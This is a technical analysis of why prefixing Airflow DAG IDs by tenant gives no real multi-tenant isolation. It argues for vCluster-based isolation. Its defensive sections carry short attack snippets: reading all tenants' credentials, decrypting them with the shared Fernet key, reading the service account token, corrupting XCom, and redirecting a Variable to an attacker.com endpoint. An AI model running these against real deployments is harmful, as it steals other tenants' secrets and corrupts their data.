# DAG ID Prefix as a Multi-tenancy Strategy — Full Analysis

> **Question:** Can adding a tenant prefix to DAG IDs (e.g. `acme__daily_etl`, `globex__daily_etl`) achieve multi-tenancy on a shared Airflow deployment?
>
> **Short answer:** No — not for a commercial SaaS platform. DAG ID prefixing is a naming convention, not an isolation mechanism. This document explains exactly what it does and does not solve, and where it legitimately fits.

---

## Table of Contents

1. [What DAG ID Prefixing Is](#1-what-dag-id-prefixing-is)
2. [What It Solves](#2-what-it-solves)
3. [What It Does NOT Solve](#3-what-it-does-not-solve)
4. [Security Vulnerabilities in Detail](#4-security-vulnerabilities-in-detail)
5. [The Isolation Spectrum](#5-the-isolation-spectrum)
6. [Pros and Cons Summary](#6-pros-and-cons-summary)
7. [When Prefixing IS Appropriate](#7-when-prefixing-is-appropriate)
8. [When Prefixing Is NOT Appropriate](#8-when-prefixing-is-not-appropriate)
9. [Using Prefixing Alongside Real Isolation](#9-using-prefixing-alongside-real-isolation)
10. [Verdict](#10-verdict)

---

## 1. What DAG ID Prefixing Is

DAG ID prefixing is the practice of adding a tenant identifier to the beginning of every DAG ID in a shared Airflow deployment:

```python
# Tenant A's DAG
from airflow import DAG

with DAG(
    dag_id="acme__daily_etl",          # prefix: acme
    schedule_interval="@daily",
) as dag:
    ...

# Tenant B's DAG
with DAG(
    dag_id="globex__daily_etl",        # prefix: globex
    schedule_interval="@daily",
) as dag:
    ...
```

All tenants' DAGs run on the **same Airflow deployment** — same scheduler, same workers, same metadata database, same webserver. The prefix is purely a string convention applied to the `dag_id` field.

Some teams extend this to other naming conventions:

```python
# Extended prefix convention
dag_id    = "acme__daily_etl"
pool      = "acme__pool"
queue     = "acme__queue"
variable  = "acme__db_password"
conn_id   = "acme__postgres"
```

This looks like isolation. It is not.

---

## 2. What It Solves

These are the genuine, legitimate benefits of DAG ID prefixing:

### 2.1 Visual separation in the Airflow UI

The Airflow web UI lists DAGs alphabetically. With prefixes, all of Tenant A's DAGs group together visually:

```
acme__daily_etl
acme__hourly_sync
acme__weekly_report
globex__daily_etl
globex__nightly_batch
initech__data_pipeline
```

This makes it easier for a platform operator to visually identify which DAGs belong to which tenant without additional tooling.

### 2.2 Simple filtering in logs and the metadata DB

You can filter DAG runs by tenant using a simple `LIKE` query or log grep:

```sql
-- Find all DAG runs for tenant acme
SELECT * FROM dag_run
WHERE dag_id LIKE 'acme__%'
ORDER BY execution_date DESC;
```

```bash
# Filter logs by tenant
grep "acme__" /var/log/airflow/scheduler.log
```

### 2.3 Basic UI access control with Airflow RBAC

Airflow's built-in RBAC allows you to create roles that restrict which DAGs a user can see in the web UI:

```python
# In Airflow's security manager
# Create a role that can only see DAGs with the acme prefix
acme_role = security_manager.add_role("AcmeViewer")
security_manager.add_permission_role(
    acme_role,
    security_manager.find_permission_view_menu(
        "can_read", "DAG:acme__daily_etl"
    )
)
```

Users assigned the `AcmeViewer` role will only see Tenant A's DAGs in the web UI.

### 2.4 Pool and queue organisation

You can create named pools and queues per tenant to give a degree of resource organisation:

```python
# Airflow pool for tenant acme (max 10 concurrent tasks)
# Created via UI or CLI:
# airflow pools set acme__pool 10 "Pool for acme tenant"

with DAG(dag_id="acme__daily_etl") as dag:
    task = PythonOperator(
        task_id="process",
        pool="acme__pool",        # tasks run in acme's pool
        queue="acme__queue",      # tasks routed to acme's worker queue
    )
```

### 2.5 Zero infrastructure overhead

A shared deployment with prefixed DAG IDs requires no additional Kubernetes namespaces, no extra Helm releases, no additional Aurora databases, and no DNS records. It is the simplest possible deployment model.

---

## 3. What It Does NOT Solve

This is the critical section. Every item below is a genuine isolation requirement for a commercial multi-tenant platform that DAG ID prefixing completely fails to address.

### 3.1 Metadata database isolation

The Airflow metadata database stores everything: DAG runs, task instances, XCom values, connections, variables, pools, and users. All of this is in **shared tables with no row-level security**.

Any DAG running on the shared Airflow instance has direct SQLAlchemy access to the full metadata database:

```python
# Tenant A's DAG — can read ALL tenants' data
from airflow.models import DagRun, Variable, Connection, XCom
from airflow import settings

session = settings.Session()

# Read all tenants' DAG run history
all_runs = session.query(DagRun).all()

# Read all tenants' XCom values (may contain sensitive data)
all_xcom = session.query(XCom).all()

# Read all tenants' Variables (may contain API keys, passwords)
all_vars = session.query(Variable).all()

# Read all tenants' Connections (contains credentials)
all_conns = session.query(Connection).all()
```

The prefix on the DAG ID is irrelevant here. The ORM does not filter by prefix. A tenant can access every other tenant's data with standard Airflow Python APIs.

### 3.2 Connections and Variables are global

Airflow Connections and Variables are stored in the metadata DB without any tenant-level access control. A naming convention like `acme__postgres` is just a string — there is no enforcement:

```python
from airflow.hooks.base import BaseHook
from airflow.models import Variable

# Tenant B's DAG accessing Tenant A's connection — this works
conn = BaseHook.get_connection("acme__postgres")
print(conn.password)   # prints Tenant A's database password

# Tenant B reading Tenant A's variable — this works
secret = Variable.get("acme__api_key")
print(secret)          # prints Tenant A's API key
```

There is no access control enforcement at the Connection or Variable level in Airflow. The prefix is a social contract, not a technical barrier.

### 3.3 Scheduler is a single point of failure

With a shared scheduler, one tenant's bad DAG can impact all tenants:

```python
# Tenant A deploys a DAG with an import error
# This crashes the DagFileProcessor for this file
import non_existent_library   # ImportError

with DAG(dag_id="acme__broken_dag") as dag:
    ...
```

**Effect on all other tenants:**
- The DagFileProcessor stops parsing all DAG files in the queue while it handles the error
- In Airflow 2.x, persistent import errors slow the scheduler heartbeat
- If the scheduler OOMs due to Tenant A's memory-heavy DAG parsing, all tenants' scheduling stops until the scheduler pod restarts

### 3.4 Noisy neighbor — resource starvation

Task slot consumption is global. If one tenant submits a burst of tasks, other tenants are starved:

```
Total KubernetesExecutor worker capacity: 50 concurrent pods

09:00 AM — Tenant A triggers a backfill of 365 daily DAG runs
           → 365 task pods queued
           → Airflow fills all 50 slots with Tenant A's tasks

09:00 AM — Tenant B's SLA-critical hourly pipeline triggers
           → 0 slots available
           → Tenant B's tasks queue behind Tenant A's backfill
           → Tenant B misses their SLA

DAG ID prefix does nothing here. acme__ and globex__ tasks
compete for the same pool of worker slots.
```

Named pools help partially (Tenant B has a reserved pool of 5 slots), but a pool misconfiguration or a tenant that exceeds their pool setting can still cascade.

### 3.5 Worker process shares environment

All task pods (with KubernetesExecutor) or all worker processes (with CeleryExecutor) share the same container image, the same environment variables, and the same mounted secrets. A task running for Tenant A and a task running for Tenant B are indistinguishable at the OS level:

```bash
# Inside any task pod / worker process:
env | grep AIRFLOW   # sees ALL Airflow environment variables
                     # including AIRFLOW__CORE__FERNET_KEY
                     # which decrypts ALL tenants' encrypted connections

cat /var/run/secrets/kubernetes.io/serviceaccount/token
# sees the Kubernetes service account token
# which may have IAM permissions touching all tenants' S3 buckets
```

### 3.6 RBAC is UI-only, not execution-level

Airflow RBAC controls what a **user sees in the web interface**. It has zero effect on what **DAG code can do at runtime**. A DAG runs as the Airflow worker process — RBAC is not consulted during task execution.

```
User login RBAC:   Tenant A's users can only see acme__ DAGs in the UI ✓
DAG execution:     Tenant A's DAG code can access all connections,
                   all variables, all metadata DB rows              ✗
```

These are two completely separate security layers. Passing RBAC does not mean passing execution isolation.

### 3.7 No audit trail per tenant

With a shared deployment, your audit log (Airflow's `log` table and file logs) contains all tenants' activity interleaved. Providing a tenant with their own audit log requires post-processing to filter by DAG ID prefix — error-prone and incomplete, since many log lines don't include the DAG ID.

### 3.8 No independent scaling per tenant

You cannot scale one tenant's workers independently. If Tenant A needs 50 workers and Tenant B needs 2, the entire worker pool scales to serve the combined load. There is no mechanism to say "scale Tenant A's workers to 50 without giving Tenant B access to those workers."

### 3.9 No per-tenant Airflow version or configuration

All tenants on a shared deployment run the same Airflow version, the same Python version, the same installed packages, and the same `airflow.cfg` settings. If Tenant A needs Airflow 2.7 and Tenant B is on Airflow 2.5, this model cannot accommodate them simultaneously.

---

## 4. Security Vulnerabilities in Detail

### 4.1 Fernet key exposure

Airflow encrypts sensitive connection passwords and Variable values using a Fernet key stored in `AIRFLOW__CORE__FERNET_KEY`. This key is available to all task pods as an environment variable. Any tenant's DAG code can decrypt any other tenant's encrypted credentials:

```python
from cryptography.fernet import Fernet
import os

# Available in every task pod's environment
fernet_key = os.environ["AIRFLOW__CORE__FERNET_KEY"]
f = Fernet(fernet_key.encode())

# Encrypted value from another tenant's Connection (read from metadata DB)
encrypted = b"gAAAAAB..."   # fetched via SQLAlchemy as shown above
plaintext = f.decrypt(encrypted)
print(plaintext)   # Tenant B's database password, in plain text
```

### 4.2 Cross-tenant XCom poisoning

XCom is stored in the shared metadata DB without access control. Tenant A can write XCom values with keys that collide with Tenant B's expected XCom keys, causing Tenant B's tasks to read incorrect data:

```python
# Tenant A's malicious task
from airflow.models import XCom
from airflow import settings

session = settings.Session()
# Overwrite Tenant B's XCom value
xcom = session.query(XCom).filter(
    XCom.dag_id == "globex__payment_pipeline",
    XCom.key == "transaction_amount"
).first()
xcom.value = b"0"   # corrupt Tenant B's payment amount
session.commit()
```

### 4.3 Variable injection

```python
from airflow.models import Variable

# Tenant A overwrites Tenant B's critical variable
Variable.set("globex__api_endpoint", "https://attacker.com/intercept")
# Tenant B's subsequent tasks now POST data to the attacker's endpoint
```

---

## 5. The Isolation Spectrum

```
Weakest                                                           Strongest
   │                                                                  │
   ▼                                                                  ▼

DAG ID       Airflow    Pools +     Namespace    vCluster     Dedicated
prefix       RBAC       queues      per tenant   per tenant   EKS cluster
   │            │           │            │            │            │
Naming       UI only    Resource    Network +    Own k8s      Own
convention   no exec    fairness    API isol.    API server   everything
             isolation  not secur.  shared CP    own etcd     own CP
```

DAG ID prefixing is at the far left. It is a naming convention with no enforcement at any layer below the DAG ID string itself.

---

## 6. Pros and Cons Summary

### Pros

| Benefit | Description | Real-world value |
|---|---|---|
| Zero infrastructure overhead | No extra namespaces, clusters, or Helm releases | High — dramatically simpler ops |
| Visual grouping in UI | DAGs sort alphabetically by tenant prefix | Medium — useful for operators |
| Easy log filtering | `grep acme__` or SQL `LIKE 'acme__%'` | Medium — useful for debugging |
| UI RBAC integration | Airflow RBAC can filter visible DAGs by prefix | Low — UI only, not execution |
| Simple pool organisation | Named pools per tenant prefix | Low — partial resource fairness only |
| No tenant onboarding delay | New tenant = push a DAG file, no provisioning | High — for internal trusted platforms |

### Cons

| Problem | Severity | Description |
|---|---|---|
| Shared metadata DB | Critical | All tenants' data in same tables, no row-level security |
| Global connections/variables | Critical | Any tenant can read any other tenant's credentials |
| Fernet key shared | Critical | Any task can decrypt any encrypted credential |
| Single scheduler SPOF | High | One bad DAG can degrade all tenants' scheduling |
| Noisy neighbor (resources) | High | One tenant's burst consumes all worker slots |
| No execution isolation | High | RBAC does not apply during task runtime |
| No independent scaling | Medium | Cannot scale one tenant's workers independently |
| No version independence | Medium | All tenants locked to same Airflow/Python version |
| Shared audit log | Medium | Cannot provide per-tenant audit trail cleanly |
| No blast radius control | High | Scheduler crash or DB corruption affects all tenants |
| Convention not enforcement | Critical | Prefix is a string — any DAG can ignore it |

---

## 7. When Prefixing IS Appropriate

DAG ID prefixing is a valid and recommended practice in these specific contexts:

### 7.1 Single-organisation internal platform

Your users are all employees or contractors of the same organisation. They are trusted, they signed an acceptable use policy, and a data breach between teams is a policy violation, not a security incident. In this context:

- Prefix DAG IDs by team or business unit
- Use Airflow RBAC to control which teams see which DAGs in the UI
- Use pools to give each team a fair share of worker slots
- Accept that the shared metadata DB is a trust boundary, not a security boundary

**Examples:** Data engineering platform for a single company, internal ML pipeline orchestration, BI team shared workflow environment.

### 7.2 Convenience layer on top of real isolation

Even with vCluster-per-tenant isolation, prefixing DAG IDs is still a good practice inside each tenant's Airflow deployment. It makes cross-environment DAG identification unambiguous in logs shipped to a central observability platform:

```python
# Inside Tenant A's isolated vCluster — prefixing still useful
dag_id = "acme__prod__daily_etl"   # tenant + environment + dag name
```

When your control plane aggregates logs from 2,000 tenants into a central CloudWatch log group, the tenant prefix in the DAG ID makes filtering trivial without requiring log metadata enrichment.

### 7.3 Development and testing environments

For an ephemeral development environment where a single engineer is testing DAGs, sharing a deployment with prefixed DAG IDs is fast and cheap. The engineer is the only user, so isolation is irrelevant.

### 7.4 Small teams with full trust

A startup with 3–5 data engineers all working on the same Airflow instance, where everyone has admin access anyway. Prefixing adds organisation without adding operational complexity.

---

## 8. When Prefixing Is NOT Appropriate

Do not rely on DAG ID prefixing as your isolation mechanism in these contexts:

### 8.1 Commercial SaaS platform with paying customers

Your tenants are external customers. They have a reasonable expectation that their data, credentials, and DAG logic are private. DAG ID prefixing provides no such guarantee. A single malicious or poorly written DAG can expose all other customers' credentials.

**Legal exposure:** Depending on your jurisdiction and contracts, a data breach caused by inadequate tenant isolation in a shared Airflow deployment could constitute a GDPR violation, a breach of your SLA, or grounds for litigation.

### 8.2 Any customer with compliance requirements

Customers subject to HIPAA, SOC 2, PCI-DSS, ISO 27001, or FedRAMP require demonstrable isolation between their data and other tenants' data. A shared metadata database with prefix-based naming conventions will not satisfy any of these compliance frameworks.

### 8.3 Customers with sensitive credentials in Connections

If your tenants store database passwords, API keys, cloud credentials, or OAuth tokens in Airflow Connections or Variables, a shared deployment exposes those credentials to all other tenants. This is not a theoretical risk — it requires only basic Python knowledge to exploit.

### 8.4 Any multi-tenant offering marketed as isolated

If your marketing, documentation, or contracts state or imply that tenants are isolated from each other, and your actual implementation is a shared Airflow deployment with DAG ID prefixes, this is a misrepresentation that creates legal and reputational risk.

---

## 9. Using Prefixing Alongside Real Isolation

The right pattern is to use DAG ID prefixing as a **secondary convenience layer** on top of proper isolation (vCluster per tenant), not as a replacement for it.

### Inside each tenant's isolated vCluster

```python
# Tenant acme's DAG, running in their isolated vCluster
# Prefix still useful for: log aggregation, observability, multi-env clarity
with DAG(
    dag_id="acme__prod__daily_etl",    # tenant__env__dag_name
    tags=["tenant:acme", "env:prod", "team:data-engineering"],
) as dag:
    ...
```

### In your central observability platform

Your control plane aggregates logs from all tenants' vClusters into a central CloudWatch log group. The DAG ID prefix lets you filter without relying on log metadata:

```sql
-- Central observability DB: find all failing DAGs for tenant acme
SELECT tenant_id, dag_id, execution_date, state
FROM central_dag_runs
WHERE dag_id LIKE 'acme__%'
  AND state = 'failed'
ORDER BY execution_date DESC;
```

### In your billing system

The DAG ID prefix gives you a secondary key to cross-reference task execution counts for billing, without having to join through the tenant registry:

```python
# Billing job: count task instances per tenant this month
from collections import defaultdict

task_counts = defaultdict(int)
for task in get_all_task_instances(month="2024-01"):
    tenant = task.dag_id.split("__")[0]   # extract prefix
    task_counts[tenant] += 1

# Cross-reference with tenant registry for billing
```

---

## 10. Verdict

### For a commercial managed Airflow platform targeting 2,000+ tenants:

**DAG ID prefixing alone = not multi-tenancy.**

It is a useful organisational convention that belongs in your platform as a secondary layer. It should never be the primary isolation mechanism for a commercial SaaS product.

### The right layered approach:

```
Layer 1 — Infrastructure isolation:   vCluster per tenant (hard boundary)
Layer 2 — Network isolation:          NetworkPolicy on host EKS cluster
Layer 3 — Secret isolation:           Secrets Manager namespaced per tenant
Layer 4 — Naming convention:          DAG ID prefix (acme__env__dag_name)
Layer 5 — UI access control:          Airflow RBAC scoped to tenant's DAGs
Layer 6 — Resource fairness:          Pools and queues per tenant
```

Layers 1–3 provide security. Layers 4–6 provide convenience and organisation. DAG ID prefixing is Layer 4 — it enhances the system once real isolation exists, but it cannot substitute for Layers 1–3.

### Decision table:

| Your situation | Use prefixing? | Use vCluster? |
|---|---|---|
| Internal platform, trusted users only | Yes, as primary org tool | Optional |
| External SaaS, paying customers | Yes, as secondary layer | Yes, required |
| Compliance-driven customers (HIPAA etc.) | Yes, as secondary layer | Yes + dedicated cluster |
| Dev/test environments, single engineer | Yes, for convenience | Optional |
| Marketing as "isolated" to customers | Only as secondary layer | Yes, required |

---

*Analysis document v1.0 — DAG ID prefix multi-tenancy evaluation for managed Airflow platform.*
